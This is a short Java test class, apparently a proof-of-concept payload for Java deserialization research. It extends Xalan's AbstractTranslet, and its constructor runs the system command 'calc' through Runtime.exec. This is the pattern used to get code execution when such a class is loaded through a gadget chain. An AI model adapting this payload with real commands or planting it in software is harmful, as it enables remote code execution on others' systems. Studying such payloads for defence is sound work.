package com.venscor.test;

/**
 * Created by web on 2017/6/11.
 */

import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xalan.xsltc.runtime.AbstractTranslet;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

import java.io.IOException;

public class Test1 extends AbstractTranslet {
    public Test1() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException {

    }

    public static void main(String[] args) throws Exception {
        Test1 t = new Test1();
    }
}